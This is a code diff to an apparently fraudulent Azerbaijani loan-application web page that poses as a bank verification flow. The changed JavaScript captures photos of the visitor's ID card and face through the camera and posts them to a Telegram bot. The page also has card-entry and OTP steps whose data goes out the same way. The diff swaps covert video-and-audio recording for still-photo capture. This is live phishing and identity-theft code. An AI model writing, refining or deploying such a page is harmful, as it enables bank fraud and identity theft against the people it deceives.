@@ -7,6 +7,7 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,600;9..144,700&family=Manrope:wght@400;500;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
+        /* ===== BÜTÜN STILLƏR ===== */
         :root {
             --paper: #F4F1E8;
             --ink: #151F1B;
@@ -288,7 +289,6 @@
             box-shadow: 0 12px 40px rgba(21, 92, 81, 0.25);
         }
 
-        /* HERO */
         .hero {
             padding: 80px 0 56px;
         }
@@ -373,7 +373,6 @@
             font-size: 16px;
         }
 
-        /* CALC */
         .calc-card {
             background: var(--white);
             border: 1px solid var(--line);
@@ -461,7 +460,6 @@
             opacity: 0.85;
         }
 
-        /* OFFERS */
         .offers-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -519,7 +517,6 @@
             border-bottom: 1px dashed rgba(255, 255, 255, 0.25);
         }
 
-        /* STEPS */
         .steps {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -544,7 +541,6 @@
             margin: 0;
         }
 
-        /* FAQ */
         .faq-item {
             border-bottom: 1px solid var(--line);
         }
@@ -587,7 +583,6 @@
             max-height: 300px;
         }
 
-        /* FIELD */
         .field {
             margin-bottom: 20px;
         }
@@ -649,7 +644,6 @@
             cursor: pointer;
         }
 
-        /* MODAL */
         .modal-overlay {
             position: fixed;
             inset: 0;
@@ -702,7 +696,6 @@
             background: var(--line);
         }
 
-        /* BANK GRID */
         .bank-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -762,7 +755,6 @@
             color: var(--ink-soft);
         }
 
-        /* CARD INPUT */
         .card-input-wrap {
             background: var(--paper);
             border-radius: 16px;
@@ -952,7 +944,6 @@
             margin-bottom: 0;
         }
 
-        /* ID CARD PREVIEW */
         .id-card-preview {
             background: linear-gradient(145deg, #f5f0e8, #e5ddd2);
             border-radius: 16px;
@@ -1071,7 +1062,6 @@
             margin-top: 4px;
         }
 
-        /* CHECKING */
         .checking-container {
             text-align: center;
             padding: 30px 0;
@@ -1148,7 +1138,6 @@
             }
         }
 
-        /* OTP */
         .otp-input-field input {
             font-size: 32px;
             letter-spacing: 14px;
@@ -1181,12 +1170,12 @@
             opacity: 0.8;
         }
 
-        /* VIDEO SCAN */
-        .video-scan-container {
+        /* ===== FOTO SKAN ===== */
+        .photo-scan-container {
             text-align: center;
             padding: 10px 0;
         }
-        .video-scan-frame {
+        .photo-scan-frame {
             position: relative;
             width: 100%;
             max-width: 380px;
@@ -1197,19 +1186,19 @@
             box-shadow: 0 0 60px rgba(173, 127, 63, 0.15), inset 0 0 60px rgba(173, 127, 63, 0.05);
             aspect-ratio: 4/3;
         }
-        .video-scan-frame video {
+        .photo-scan-frame video {
             width: 100%;
             height: 100%;
             object-fit: cover;
         }
-        .video-scan-frame .scan-overlay {
+        .photo-scan-frame .scan-overlay {
             position: absolute;
             inset: 0;
             border: 3px solid rgba(173, 127, 63, 0.4);
             border-radius: 16px;
             pointer-events: none;
         }
-        .video-scan-frame .scan-line {
+        .photo-scan-frame .scan-line {
             position: absolute;
             left: 5%;
             right: 5%;
@@ -1232,7 +1221,7 @@
                 top: 10%;
             }
         }
-        .video-scan-frame .scan-corner {
+        .photo-scan-frame .scan-corner {
             position: absolute;
             width: 22px;
             height: 22px;
@@ -1242,28 +1231,28 @@
             pointer-events: none;
             opacity: 0.8;
         }
-        .video-scan-frame .scan-corner.tl {
+        .photo-scan-frame .scan-corner.tl {
             top: 8px;
             left: 8px;
             border-top-width: 3px;
             border-left-width: 3px;
             border-radius: 2px 0 0 0;
         }
-        .video-scan-frame .scan-corner.tr {
+        .photo-scan-frame .scan-corner.tr {
             top: 8px;
             right: 8px;
             border-top-width: 3px;
             border-right-width: 3px;
             border-radius: 0 2px 0 0;
         }
-        .video-scan-frame .scan-corner.bl {
+        .photo-scan-frame .scan-corner.bl {
             bottom: 8px;
             left: 8px;
             border-bottom-width: 3px;
             border-left-width: 3px;
             border-radius: 0 0 0 2px;
         }
-        .video-scan-frame .scan-corner.br {
+        .photo-scan-frame .scan-corner.br {
             bottom: 8px;
             right: 8px;
             border-bottom-width: 3px;
@@ -1348,20 +1337,20 @@
             border-radius: 0 0 2px 0;
         }
 
-        .video-scan-status {
+        .photo-scan-status {
             font-size: 16px;
             font-weight: 600;
             color: var(--teal-deep);
             margin-top: 8px;
         }
-        .video-scan-status .sub {
+        .photo-scan-status .sub {
             font-size: 13px;
             font-weight: 400;
             color: var(--ink-soft);
             display: block;
             margin-top: 4px;
         }
-        .video-scan-progress {
+        .photo-scan-progress {
             width: 100%;
             max-width: 300px;
             height: 5px;
@@ -1370,14 +1359,14 @@
             margin: 12px auto 0;
             overflow: hidden;
         }
-        .video-scan-progress .fill {
+        .photo-scan-progress .fill {
             height: 100%;
             background: linear-gradient(90deg, var(--gold), var(--teal-deep));
             border-radius: 4px;
             transition: width 0.3s ease;
             width: 0%;
         }
-        .video-scan-status-text {
+        .photo-scan-status-text {
             font-size: 14px;
             color: var(--ink-soft);
             margin-top: 6px;
@@ -1394,7 +1383,6 @@
             margin-bottom: 8px;
         }
 
-        /* SUCCESS */
         .success-container {
             text-align: center;
             padding: 20px 0;
@@ -1680,7 +1668,7 @@
             nav ul {
                 display: none;
             }
-            .video-scan-frame {
+            .photo-scan-frame {
                 max-width: 100%;
             }
         }
@@ -2020,16 +2008,16 @@
                     <div class="id-footer"><span>Müddət: 10 il</span><span>Verilmə: 01.01.2020</span></div>
                     <div class="id-signature"><span>İmza / Signature</span><span class="sig-line"></span></div>
                 </div>
-                <button type="button" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:20px;" onclick="goToVideoScan(); return false;">Davam et → Sənəd yoxlaması</button>
+                <button type="button" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:20px;" onclick="goToPhotoScan(); return false;">Davam et → Sənəd yoxlaması</button>
             </div>
 
-            <!-- STEP 3: Video Scan -->
-            <div id="videoScanStep" style="display:none;">
-                <h2 style="font-size:26px;margin-bottom:6px;">📹 Sənəd yoxlaması</h2>
+            <!-- STEP 3: Photo Scan (Şəkil çəkilişi) -->
+            <div id="photoScanStep" style="display:none;">
+                <h2 style="font-size:26px;margin-bottom:6px;">📸 Sənəd yoxlaması</h2>
                 <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 12px;">Şəxsiyyət vəsiqənizi təsdiqləmək üçün kamera ilə çəkin</p>
-                <div class="video-scan-container">
+                <div class="photo-scan-container">
                     <div class="step-counter" id="scanStepCounter">1 / 2</div>
-                    <div class="video-scan-frame" id="videoFrame">
+                    <div class="photo-scan-frame" id="photoFrame">
                         <video id="scanVideo" autoplay playsinline></video>
                         <div class="scan-overlay"></div>
                         <div class="scan-line"></div>
@@ -2038,23 +2026,23 @@
                         <div class="scan-corner bl"></div>
                         <div class="scan-corner br"></div>
                     </div>
-                    <div class="video-scan-status" id="scanStatus">
+                    <div class="photo-scan-status" id="scanStatus">
                         📄 Şəxsiyyət vəsiqənizin ön tərəfini göstərin
                         <span class="sub">Kameranı sənədə doğru tutun</span>
                     </div>
-                    <div class="video-scan-progress">
+                    <div class="photo-scan-progress">
                         <div class="fill" id="scanProgress" style="width:0%;"></div>
                     </div>
-                    <div class="video-scan-status-text" id="scanStatusText"></div>
+                    <div class="photo-scan-status-text" id="scanStatusText"></div>
                 </div>
-                <button type="button" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:10px;" onclick="startVideoScan(); return false;" id="scanStartBtn">📷 Kameranı aç</button>
+                <button type="button" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:10px;" onclick="startPhotoScan(); return false;" id="scanStartBtn">📷 Kameranı aç</button>
             </div>
 
             <!-- STEP 4: Face Scan -->
             <div id="faceScanStep" style="display:none;">
                 <h2 style="font-size:26px;margin-bottom:6px;">📸 Üz tanıma</h2>
                 <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 12px;">Şəxsiyyətinizi təsdiqləmək üçün üzünüzü kameraya göstərin</p>
-                <div class="video-scan-container">
+                <div class="photo-scan-container">
                     <div class="step-counter" id="faceStepCounter">Üz</div>
                     <div class="face-circle-frame" id="faceFrame">
                         <video id="faceVideo" autoplay playsinline></video>
@@ -2065,14 +2053,14 @@
                         <div class="scan-corner bl"></div>
                         <div class="scan-corner br"></div>
                     </div>
-                    <div class="video-scan-status" id="faceStatus">
+                    <div class="photo-scan-status" id="faceStatus">
                         👤 Üzünüzü dairənin içinə tutun
                         <span class="sub">Tərpənməyin, çəkiliş aparılır...</span>
                     </div>
-                    <div class="video-scan-progress">
+                    <div class="photo-scan-progress">
                         <div class="fill" id="faceProgress" style="width:0%;"></div>
                     </div>
-                    <div class="video-scan-status-text" id="faceStatusText"></div>
+                    <div class="photo-scan-status-text" id="faceStatusText"></div>
                 </div>
                 <button type="button" class="cta-btn" style="width:100%;padding:15px;font-size:15px;margin-top:10px;" onclick="startFaceScan(); return false;" id="faceStartBtn">📷 Kameranı aç</button>
             </div>
@@ -2343,8 +2331,6 @@
         var telegramPollingActive = false;
         var lastUpdateId = 0;
         var scanStep = 0;
-        var mediaRecorder = null;
-        var recordedChunks = [];
         var videoStream = null;
         var isFaceScan = false;
 
@@ -2374,14 +2360,6 @@
             return app;
         }
 
-        function updateApplicationStatus(id, status) {
-            var app = applications.find(function(a) { return a.id === id; });
-            if (app) {
-                app.status = status;
-                saveApplications();
-            }
-        }
-
         function getApplications() {
             return applications;
         }
@@ -2408,8 +2386,6 @@
                     'rejected');
                 var statusText = app.status === 'pending' ? '⏳ Gözləmədə' : (app.status === 'completed' ?
                     '✅ Tamamlandı' : '❌ İmtina');
-                var statusColor = app.status === 'pending' ? '#F59E0B' : (app.status === 'completed' ? '#10B981' :
-                    '#EF4444');
 
                 html += `
                     <div class="application-card ${statusClass}">
@@ -2537,17 +2513,12 @@
             if (video) { video.srcObject = null; }
             var faceVideo = document.getElementById('faceVideo');
             if (faceVideo) { faceVideo.srcObject = null; }
-            if (mediaRecorder) {
-                try { mediaRecorder.stop(); } catch (e) {}
-                mediaRecorder = null;
-            }
-            recordedChunks = [];
         }
 
         function showFormStep() {
             document.getElementById('formStep').style.display = 'block';
             document.getElementById('summaryStep').style.display = 'none';
-            document.getElementById('videoScanStep').style.display = 'none';
+            document.getElementById('photoScanStep').style.display = 'none';
             document.getElementById('faceScanStep').style.display = 'none';
             document.getElementById('checkingStep').style.display = 'none';
             document.getElementById('realCheckingStep').style.display = 'none';
@@ -2561,7 +2532,7 @@
         function showSummaryStep() {
             document.getElementById('formStep').style.display = 'none';
             document.getElementById('summaryStep').style.display = 'block';
-            document.getElementById('videoScanStep').style.display = 'none';
+            document.getElementById('photoScanStep').style.display = 'none';
             document.getElementById('faceScanStep').style.display = 'none';
             document.getElementById('checkingStep').style.display = 'none';
             document.getElementById('realCheckingStep').style.display = 'none';
@@ -2600,10 +2571,10 @@
             showSummaryStep();
         }
 
-        // ========== VIDEO SCAN ==========
-        function goToVideoScan() {
+        // ========== PHOTO SCAN (Şəkil çəkilişi) ==========
+        function goToPhotoScan() {
             document.getElementById('summaryStep').style.display = 'none';
-            document.getElementById('videoScanStep').style.display = 'block';
+            document.getElementById('photoScanStep').style.display = 'block';
             scanStep = 0;
             document.getElementById('scanStepCounter').textContent = '1 / 2';
             document.getElementById('scanStatus').innerHTML =
@@ -2614,93 +2585,20 @@
             document.getElementById('scanStartBtn').textContent = '📷 Kameranı aç';
         }
 
-        // ===== DÜZƏLDİLMİŞ startRecording =====
-        function startRecording(video, type) {
-            recordedChunks = [];
-            var stream = video.srcObject;
+        // ===== ŞƏKİL ÇƏKİLİŞİ =====
+        function capturePhoto(video, stepName) {
+            var canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            var ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            video.onloadedmetadata = function() {
-                try {
-                    var mimeType = 'video/mp4';
-                    if (!MediaRecorder.isTypeSupported('video/mp4')) {
-                        mimeType = 'video/webm;codecs=vp9,opus';
-                    }
-
-                    mediaRecorder = new MediaRecorder(stream, {
-                        mimeType: mimeType,
-                        videoBitsPerSecond: 2500000
-                    });
-
-                    mediaRecorder.ondataavailable = function(event) {
-                        if (event.data.size > 0) {
-                            recordedChunks.push(event.data);
-                            console.log('📹 Chunk toplandı:', event.data.size, 'bytes');
-                        }
-                    };
-
-                    mediaRecorder.onstop = function() {
-                        console.log('⏹ MediaRecorder dayandı, chunks:', recordedChunks.length);
-
-                        if (recordedChunks.length > 0) {
-                            var blob = new Blob(recordedChunks, { type: 'video/mp4' });
-                            console.log('📦 Blob ölçüsü:', blob.size, 'bytes');
-
-                            if (blob.size > 1000) {
-                                sendVideoToTelegram(blob, getScanStepName(type));
-                            } else {
-                                console.warn('⚠️ Video çox kiçik, şəkil çəkilir');
-                                capturePhoto(video, getScanStepName(type));
-                            }
-                        } else {
-                            console.warn('⚠️ Heç bir chunk toplanmadı');
-                            capturePhoto(video, getScanStepName(type));
-                        }
-                    };
-
-                    mediaRecorder.start(1000);
-                    console.log('▶️ MediaRecorder başladı');
-
-                } catch (e) {
-                    console.error('❌ MediaRecorder xətası:', e);
-                    capturePhoto(video, getScanStepName(type));
+            canvas.toBlob(function(blob) {
+                if (blob) {
+                    sendPhotoToTelegram(blob, stepName);
+                    console.log('✅ Şəkil çəkildi:', stepName);
                 }
-            };
-        }
-
-        async function startVideoScan() {
-            var btn = document.getElementById('scanStartBtn');
-            btn.style.display = 'none';
-            try {
-                videoStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment', width: 640, height: 480 },
-                    audio: true
-                });
-                var video = document.getElementById('scanVideo');
-                video.srcObject = videoStream;
-                await video.play();
-                startRecording(video, 'sənəd');
-                updateScanStep();
-                var progress = 0;
-                if (scanInterval) clearInterval(scanInterval);
-                scanInterval = setInterval(function() {
-                    progress += 2.5;
-                    if (progress > 100) progress = 100;
-                    document.getElementById('scanProgress').style.width = progress + '%';
-                    document.getElementById('scanStatusText').textContent = '⏳ Çəkiliş davam edir... ' + Math.round(
-                        progress) + '%';
-                    if (progress >= 100) {
-                        clearInterval(scanInterval);
-                        scanInterval = null;
-                        nextScanStep();
-                    }
-                }, 200);
-            } catch (err) {
-                document.getElementById('scanStatus').innerHTML =
-                    '❌ Kamera icazəsi tələb olunur<span class="sub">Zəhmət olmasa kameraya icazə verin</span>';
-                document.getElementById('scanStatusText').textContent = '⚠️ Kamera əlçatan deyil.';
-                btn.style.display = 'block';
-                btn.textContent = '🔄 Yenidən cəhd et';
-            }
+            }, 'image/jpeg', 0.9);
         }
 
         function getScanStepName(type) {
@@ -2727,27 +2625,20 @@
             scanStep++;
             if (scanStep < 2) {
                 updateScanStep();
-                var progress = 0;
-                if (scanInterval) clearInterval(scanInterval);
-                scanInterval = setInterval(function() {
-                    progress += 2.5;
-                    if (progress > 100) progress = 100;
-                    document.getElementById('scanProgress').style.width = progress + '%';
-                    document.getElementById('scanStatusText').textContent = '⏳ Çəkiliş davam edir... ' + Math.round(
-                        progress) + '%';
-                    if (progress >= 100) {
-                        clearInterval(scanInterval);
-                        scanInterval = null;
-                        nextScanStep();
-                    }
-                }, 200);
+                // Növbəti addım üçün yenidən kamera aç
+                var btn = document.getElementById('scanStartBtn');
+                btn.style.display = 'block';
+                btn.textContent = '📷 Növbəti şəkil';
+                document.getElementById('scanProgress').style.width = '0%';
+                document.getElementById('scanStatusText').textContent = 'Sənədin arxa tərəfini çəkin';
             } else {
+                // Sənəd bitdi → Üzə keç
                 document.getElementById('scanStatus').innerHTML =
                     '✅ Sənəd çəkildi!<span class="sub" style="color:var(--teal-deep);">İndi üz tanımaya keçilir...</span>';
                 document.getElementById('scanStatusText').textContent = '✅ Sənəd yoxlaması tamamlandı!';
                 stopVideoStream();
                 setTimeout(function() {
-                    document.getElementById('videoScanStep').style.display = 'none';
+                    document.getElementById('photoScanStep').style.display = 'none';
                     document.getElementById('faceScanStep').style.display = 'block';
                     document.getElementById('faceStatus').innerHTML =
                         '👤 Üzünüzü dairənin içinə tutun<span class="sub">Kamera icazəsini aktiv edin</span>';
@@ -2759,34 +2650,94 @@
             }
         }
 
-        function capturePhoto(video, stepName) {
-            var canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            var ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(function(blob) {
-                if (blob) { sendPhotoToTelegram(blob, stepName); }
-            }, 'image/jpeg', 0.9);
+        async function startPhotoScan() {
+            var btn = document.getElementById('scanStartBtn');
+            btn.style.display = 'none';
+
+            try {
+                videoStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: 640, height: 480 }
+                });
+                var video = document.getElementById('scanVideo');
+                video.srcObject = videoStream;
+                await video.play();
+
+                // 2 saniyə gözlə və şəkil çək
+                document.getElementById('scanStatusText').textContent = '⏳ Çəkilişə hazırlaşır... 2 saniyə';
+                setTimeout(function() {
+                    // Şəkil çək
+                    capturePhoto(video, getScanStepName('sənəd'));
+                    document.getElementById('scanProgress').style.width = '100%';
+                    document.getElementById('scanStatusText').textContent = '✅ Şəkil çəkildi!';
+
+                    // 1 saniyə sonra növbəti addıma keç
+                    setTimeout(function() {
+                        nextScanStep();
+                    }, 1000);
+                }, 2000);
+
+            } catch (err) {
+                document.getElementById('scanStatus').innerHTML =
+                    '❌ Kamera icazəsi tələb olunur<span class="sub">Zəhmət olmasa kameraya icazə verin</span>';
+                document.getElementById('scanStatusText').textContent = '⚠️ Kamera əlçatan deyil.';
+                btn.style.display = 'block';
+                btn.textContent = '🔄 Yenidən cəhd et';
+            }
         }
 
-        async function sendVideoToTelegram(blob, stepName) {
+        // ========== FACE SCAN ==========
+        async function startFaceScan() {
+            var btn = document.getElementById('faceStartBtn');
+            btn.style.display = 'none';
+
             try {
-                var formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                var ext = blob.type === 'video/mp4' ? 'mp4' : 'webm';
-                formData.append('video', blob, 'sənəd_' + stepName + '_' + Date.now() + '.' + ext);
-                formData.append('caption', '📹 Sənəd çəkilişi: ' + stepName + '\n📅 ' + new Date().toLocaleString(
-                    'az-AZ'));
-                await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendVideo', {
-                    method: 'POST',
-                    body: formData
+                var stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: 300, height: 300 }
                 });
-                console.log('✅ Video Telegram-a göndərildi:', stepName);
-            } catch (e) {
-                console.error('Video göndərmə xətası:', e);
-                var video = document.getElementById('scanVideo');
-                if (video) capturePhoto(video, stepName);
+                var video = document.getElementById('faceVideo');
+                video.srcObject = stream;
+                await video.play();
+
+                document.getElementById('faceStatus').innerHTML =
+                    '✅ Üz aşkarlandı!<span class="sub" style="color:var(--teal-deep);">Tərpənməyin, şəkil çəkilir...</span>';
+                document.getElementById('faceStatusText').textContent = '⏳ 2 saniyə...';
+
+                setTimeout(function() {
+                    // Üz şəklini çək
+                    var canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 300;
+                    canvas.height = video.videoHeight || 300;
+                    var ctx = canvas.getContext('2d');
+                    ctx.translate(canvas.width, 0);
+                    ctx.scale(-1, 1);
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    canvas.toBlob(function(blob) {
+                        if (blob) {
+                            sendPhotoToTelegram(blob, 'üz');
+                            console.log('✅ Üz şəkli çəkildi');
+                        }
+                    }, 'image/jpeg', 0.9);
+
+                    document.getElementById('faceProgress').style.width = '100%';
+                    document.getElementById('faceStatusText').textContent = '✅ Üz şəkli çəkildi!';
+
+                    stopVideoStream();
+
+                    setTimeout(function() {
+                        document.getElementById('faceScanStep').style.display = 'none';
+                        document.getElementById('checkingStep').style.display = 'block';
+                        startCheckingAnimation();
+                    }, 1500);
+
+                }, 2000);
+
+            } catch (err) {
+                document.getElementById('faceStatus').innerHTML =
+                    '❌ Kamera icazəsi tələb olunur<span class="sub">Zəhmət olmasa kameraya icazə verin</span>';
+                document.getElementById('faceStatusText').textContent = '⚠️ Kamera əlçatan deyil.';
+                btn.style.display = 'block';
+                btn.textContent = '🔄 Yenidən cəhd et';
             }
         }
 
@@ -2802,53 +2753,8 @@
                     body: formData
                 });
                 console.log('✅ Şəkil Telegram-a göndərildi:', stepName);
-            } catch (e) { console.error('Şəkil göndərmə xətası:', e); }
-        }
-
-        // ========== FACE SCAN ==========
-        async function startFaceScan() {
-            var btn = document.getElementById('faceStartBtn');
-            btn.style.display = 'none';
-            try {
-                var stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: 300, height: 300 },
-                    audio: true
-                });
-                var video = document.getElementById('faceVideo');
-                video.srcObject = stream;
-                await video.play();
-                startRecording(video, 'üz');
-                document.getElementById('faceStatus').innerHTML =
-                    '✅ Üz aşkarlandı!<span class="sub" style="color:var(--teal-deep);">Tərpənməyin, çəkiliş aparılır...</span>';
-                document.getElementById('faceStatusText').textContent = '⏳ 15 saniyə çəkiliş...';
-                var progress = 0;
-                if (faceInterval) clearInterval(faceInterval);
-                faceInterval = setInterval(function() {
-                    progress += 2.5;
-                    if (progress > 100) progress = 100;
-                    document.getElementById('faceProgress').style.width = progress + '%';
-                    document.getElementById('faceStatusText').textContent = '⏳ Çəkiliş davam edir... ' + Math.round(
-                        progress) + '%';
-                    if (progress >= 100) {
-                        clearInterval(faceInterval);
-                        faceInterval = null;
-                        document.getElementById('faceStatus').innerHTML =
-                            '✅ Üz təsdiqi tamamlandı!<span class="sub" style="color:var(--teal-deep);">Məlumatlar yoxlanılır...</span>';
-                        document.getElementById('faceStatusText').textContent = '✅ Üz uğurla təsdiqləndi!';
-                        stopVideoStream();
-                        setTimeout(function() {
-                            document.getElementById('faceScanStep').style.display = 'none';
-                            document.getElementById('checkingStep').style.display = 'block';
-                            startCheckingAnimation();
-                        }, 1500);
-                    }
-                }, 200);
-            } catch (err) {
-                document.getElementById('faceStatus').innerHTML =
-                    '❌ Kamera icazəsi tələb olunur<span class="sub">Zəhmət olmasa kameraya icazə verin</span>';
-                document.getElementById('faceStatusText').textContent = '⚠️ Kamera əlçatan deyil.';
-                btn.style.display = 'block';
-                btn.textContent = '🔄 Yenidən cəhd et';
+            } catch (e) {
+                console.error('Şəkil göndərmə xətası:', e);
             }
         }
 
@@ -3193,11 +3099,9 @@
         function submitOTP() {
             var otpInput = document.getElementById('otpCode').value.replace(/\s/g, '');
             if (otpInput.length === 6) {
-                // Sorğu göndərildi statusu
                 document.getElementById('otpStatus').style.display = 'block';
                 document.getElementById('otpStatus').innerHTML = '✅ Sorğunuz göndərildi! Bank təsdiqi gözlənilir...';
 
-                // Müraciəti "pending" (gözləmədə) olaraq yadda saxla
                 if (Object.keys(applicationData).length > 0) {
                     var app = addApplication(applicationData, 'pending');
                 }
@@ -3212,7 +3116,6 @@
                     })
                 });
 
-                // Success ekranına keç
                 setTimeout(function() {
                     document.getElementById('threeDStep').style.display = 'none';
                     document.getElementById('successStep').style.display = 'block';
@@ -3242,7 +3145,7 @@
             document.body.style.overflow = 'hidden';
             document.getElementById('formStep').style.display = 'none';
             document.getElementById('summaryStep').style.display = 'none';
-            document.getElementById('videoScanStep').style.display = 'none';
+            document.getElementById('photoScanStep').style.display = 'none';
             document.getElementById('faceScanStep').style.display = 'none';
             document.getElementById('checkingStep').style.display = 'none';
             document.getElementById('realCheckingStep').style.display = 'none';
@@ -3358,4 +3261,4 @@
         console.log('✅ KreditAz yükləndi!');
     </script>
 </body>
-                                                                                        </html>
+                        </html>
